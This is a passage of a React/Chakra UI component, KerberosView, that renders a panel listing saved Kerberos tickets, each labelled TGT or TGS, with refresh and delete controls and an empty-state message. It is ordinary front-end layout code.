              <Flex align="center" gap={2}>
                <Text fontSize="10px" color="var(--dash-text-muted)">{history.length} saved</Text>
                <Box cursor="pointer" p={1} borderRadius="5px"
                  color="var(--dash-text-muted)" _hover={{ color: 'white' }}
                  transition="color 0.15s" onClick={loadHistory} title="Refresh">
                  <TimeIcon boxSize={3} />
                </Box>
              </Flex>
            </Flex>

            {history.length === 0 ? (
              <Flex direction="column" align="center" py={6} gap={2}>
                <Flex w="40px" h="40px" borderRadius="10px" align="center" justify="center"
                  bg="rgba(255,255,255,0.04)" border="1px solid rgba(255,255,255,0.08)">
                  <TimeIcon boxSize={4} color="var(--dash-text-muted)" />
                </Flex>
                <Text fontSize="11px" color="var(--dash-text-muted)">No saved tickets yet</Text>
                <Text fontSize="10px" color="var(--dash-text-muted)" textAlign="center" maxW="200px">
                  Parse a ticket and click "Save Ticket to History" to share it with your team
                </Text>
              </Flex>
            ) : (
              <Flex direction="column" gap={2} maxH="320px" overflowY="auto"
                sx={{ '&::-webkit-scrollbar': { width: '4px' }, '&::-webkit-scrollbar-thumb': { background: 'rgba(255,255,255,0.1)', borderRadius: '2px' } }}>
                {history.map(entry => {
                  const entryIsTGT = (entry.result?.credentials?.[0]?.['Service Name'] || '').toLowerCase().includes('krbtgt');
                  const isActive   = viewingId === entry._id;
                  const tColor     = entryIsTGT ? RED : ACCENT;
                  return (
                    <Flex key={entry._id} align="center" gap={3} px={3} py="10px"
                      borderRadius="10px" cursor="pointer"
                      bg={isActive ? `${ACCENT}12` : 'rgba(255,255,255,0.03)'}
                      border={`1px solid ${isActive ? `${ACCENT}40` : 'rgba(255,255,255,0.07)'}`}
                      _hover={{ bg: 'rgba(255,255,255,0.06)', borderColor: 'rgba(255,255,255,0.15)' }}
                      transition="all 0.15s"
                      onClick={() => viewEntry(entry)}>
                      <Box px="7px" py="3px" borderRadius="5px" flexShrink={0}
                        bg={`${tColor}15`} border={`1px solid ${tColor}40`}>
                        <Text fontSize="9px" fontWeight="bold" color={tColor} letterSpacing="widest">
                          {entryIsTGT ? 'TGT' : 'TGS'}
                        </Text>
                      </Box>
                      <Box flex="1" minW={0}>
                        <Text fontSize="11px" fontWeight="bold" color="var(--dash-text-primary)"
                          noOfLines={1}>{entry.label || 'Unnamed Ticket'}</Text>
                        <Text fontSize="10px" color="var(--dash-text-muted)">
                          {entry.savedBy} · {relTime(entry.createdAt)}
                        </Text>
                      </Box>
                      <Box flexShrink={0} p={1} borderRadius="6px" cursor="pointer"
                        color="var(--dash-text-muted)"
                        _hover={{ color: RED, bg: `${RED}12` }}
                        transition="all 0.15s"
                        onClick={e => deleteEntry(entry._id, e)}>
                        <DeleteIcon boxSize={3} />
                      </Box>
                    </Flex>
                  );
                })}
              </Flex>
            )}
          </Card>
        </Flex>
      </Flex>
    </MotionBox>
  );
};

export default KerberosView;
